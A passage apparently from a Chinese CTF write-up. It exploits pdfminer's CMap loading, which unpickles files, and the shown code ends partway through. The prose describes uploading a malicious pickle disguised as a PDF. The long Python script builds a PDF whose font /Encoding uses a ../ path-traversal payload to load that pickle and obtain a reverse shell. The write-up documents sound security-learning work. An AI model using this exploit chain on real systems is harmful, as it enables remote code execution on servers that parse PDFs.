<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="nd">@classmethod</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_load_data</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Any</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">.pickle.gz&#34;</span> <span class="o">%</span> <span class="n">name</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;loading: </span><span class="si">%r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmap_paths</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;CMAP_PATH&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/share/pdfminer/&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">),</span> <span class="s2">&#34;cmap&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">directory</span> <span class="ow">in</span> <span class="n">cmap_paths</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">directory</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">gzfile</span> <span class="o">=</span> <span class="n">gzip</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="nb">type</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name</span><span class="p">),</span> <span class="p">(),</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">gzfile</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">                <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">gzfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">CMapDB</span><span class="o">.</span><span class="n">CMapNotFound</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>完全可控，所以生成恶意的tar.gz和PDF文件上传即可，但是都是需要伪造成pdf文件才能够上传的，第一步生成一个有恶意opcode的n4c1.pickle.gz，然后最后的PDF还需要去解析/app/uploads/n4c1，就可以成功反弹shell了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># This script hardcodes and generates a small PDF containing a variety of</span>
</span></span><span class="line"><span class="cl"><span class="c1"># page-content operators (graphics, text, state) so you can step through</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pdfminer.six extract_pages() and observe how each operator is handled.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Output: samples/debug_ops.pdf</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Key points to help debugging pdfminer internals:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - The font is a Type0 + CIDFont with /Encoding /GB-EUC-H to trigger</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   CMapDB.get_cmap(&#39;GB-EUC-H&#39;) and thus CMapDB._load_data when not cached.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - The content stream includes operators: q/Q, cm, w, RG, rg, m, l, h, S,</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   re, f, BT/ET, Tf, Td, Tm (implicit via Td), Tj, TJ.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Chinese text bytes &lt;D6D0B9FA&gt; represent &#34;中国&#34; in GB2312, so with</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   /Encoding /GB-EUC-H pdfminer will consult the CMap.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_pdf_bytes</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">bio</span> <span class="o">=</span> <span class="n">BytesIO</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">w</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pos</span> <span class="o">=</span> <span class="n">bio</span><span class="o">.</span><span class="n">tell</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">bio</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pos</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Collect objects then build xref.</span>
</span></span><span class="line"><span class="cl">    <span class="n">objects</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">]]</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 1. Catalog</span>
</span></span><span class="line"><span class="cl">    <span class="n">objects</span><span class="o">.</span><span class="n">append</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 2. Pages</span>
</span></span><span class="line"><span class="cl">    <span class="n">objects</span><span class="o">.</span><span class="n">append</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="mi">2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 4. Type0 Font with GB-EUC-H encoding to trigger CMap loading</span>
</span></span><span class="line"><span class="cl">    <span class="n">font_type0</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mi">4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&lt;&lt; /Type /Font /Subtype /Type0 &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/BaseFont /DebugCID &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># b&#34;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Ftmp#2Fn4c1&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fapp#2Fuploads#2Fn4c1&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/DescendantFonts [6 0 R] &gt;&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">objects</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">font_type0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 6. CIDFont descendant with GB1 registry</span>
</span></span><span class="line"><span class="cl">    <span class="n">cidfont</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mi">6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&lt;&lt; /Type /Font /Subtype /CIDFontType0 &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/BaseFont /DebugCID &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/CIDSystemInfo &lt;&lt; /Registry (n4c1222) /Ordering (n4c1_2) /Supplement 5 &gt;&gt; &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/DW 1000 &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/FontDescriptor &lt;&lt; &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/Type /FontDescriptor &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/FontName /DebugCID &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/FontBBox [0 -200 1000 900] &#34;</span>  <span class="c1"># 必须是四个数字</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/Ascent 800 &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/Descent -200 &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/CapHeight 700 &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/Flags 32 &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/ItalicAngle 0 &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/StemV 80 &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">objects</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">cidfont</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 5. Page content stream — includes a variety of operators</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Note: GB2312 for 中国 is D6 D0 B9 FA</span>
</span></span><span class="line"><span class="cl">    <span class="n">content_ops</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;q&#34;</span><span class="p">,</span>  <span class="c1"># save graphics state</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;1 0 0 1 0 0 cm&#34;</span><span class="p">,</span>  <span class="c1"># identity CTM (explicit)</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;0.75 w&#34;</span><span class="p">,</span>  <span class="c1"># line width</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;0 0 1 RG&#34;</span><span class="p">,</span>  <span class="c1"># stroke color = blue</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;1 0 0 rg&#34;</span><span class="p">,</span>  <span class="c1"># fill color = red</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;100 600 m&#34;</span><span class="p">,</span>  <span class="c1"># move to</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;200 650 l&#34;</span><span class="p">,</span>  <span class="c1"># line to</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;300 600 l&#34;</span><span class="p">,</span>  <span class="c1"># line to</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;h&#34;</span><span class="p">,</span>  <span class="c1"># close path</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;S&#34;</span><span class="p">,</span>  <span class="c1"># stroke</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;100 500 150 40 re&#34;</span><span class="p">,</span>  <span class="c1"># rectangle</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;f&#34;</span><span class="p">,</span>  <span class="c1"># fill</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;BT&#34;</span><span class="p">,</span>  <span class="c1"># begin text</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/F1 24 Tf&#34;</span><span class="p">,</span>  <span class="c1"># font + size</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;100 700 Td&#34;</span><span class="p">,</span>  <span class="c1"># move text position</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&lt;48656C6C6F20504446&gt; Tj&#34;</span><span class="p">,</span>  <span class="c1"># &#34;Hello PDF&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;0 -30 Td&#34;</span><span class="p">,</span>  <span class="c1"># next line down</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&lt;D6D0B9FA&gt; Tj&#34;</span><span class="p">,</span>  <span class="c1"># &#34;中国&#34; in GB2312; mapped via GB-EUC-H</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-50 -40 Td&#34;</span><span class="p">,</span>  <span class="c1"># move</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;[(AB) -50 (&lt;20&gt;) 100 (CD)] TJ&#34;</span><span class="p">,</span>  <span class="c1"># kerning array example</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;ET&#34;</span><span class="p">,</span>  <span class="c1"># end text</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;Q&#34;</span><span class="p">,</span>  <span class="c1"># restore graphics state</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">stream</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;stream</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">content_ops</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">endstream&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">content_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;stream</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">endstream&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">content_obj</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mi">5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="sa">b</span><span class="s2">&#34;&lt;&lt; /Length </span><span class="si">%d</span><span class="s2"> &gt;&gt;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">content_len</span> <span class="o">+</span> <span class="n">stream</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">objects</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">content_obj</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 3. Page (references content and font resource)</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_dict</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mi">3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;&lt;&lt; /Type /Page /Parent 2 0 R &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/MediaBox [0 0 612 792] &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/Resources &lt;&lt; /Font &lt;&lt; /F1 4 0 R &gt;&gt; &gt;&gt; &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;/Contents 5 0 R &gt;&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Ensure ordering: add page after fonts and content so refs exist</span>
</span></span><span class="line"><span class="cl">    <span class="n">objects</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">page_dict</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Start writing file</span>
</span></span><span class="line"><span class="cl">    <span class="n">w</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;%PDF-1.4</span><span class="se">\n</span><span class="s2">%</span><span class="se">\xE2\xE3\xCF\xD3\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">offsets</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Write each object, record offsets</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">obj_id</span><span class="p">,</span> <span class="n">obj_body</span> <span class="ow">in</span> <span class="n">objects</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">offsets</span><span class="p">[</span><span class="n">obj_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">w</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">obj_id</span><span class="si">}</span><span class="s2"> 0 obj</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">w</span><span class="p">(</span><span class="n">obj_body</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">w</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">endobj</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># xref</span>
</span></span><span class="line"><span class="cl">    <span class="n">startxref</span> <span class="o">=</span> <span class="n">bio</span><span class="o">.</span><span class="n">tell</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">max_obj</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">offsets</span><span class="p">)</span> <span class="k">if</span> <span class="n">offsets</span> <span class="k">else</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># xref table requires a free entry 0</span>
</span></span><span class="line"><span class="cl">    <span class="n">w</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;xref</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">w</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;0 </span><span class="si">{</span><span class="n">max_obj</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># object 0 free</span>
</span></span><span class="line"><span class="cl">    <span class="n">w</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;0000000000 65535 f </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_obj</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">off</span> <span class="o">=</span> <span class="n">offsets</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">w</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">off</span><span class="si">:</span><span class="s2">010d</span><span class="si">}</span><span class="s2"> 00000 n </span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># trailer</span>
</span></span><span class="line"><span class="cl">    <span class="n">w</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="sa">b</span><span class="s2">&#34;trailer</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&lt;&lt; &#34;</span>
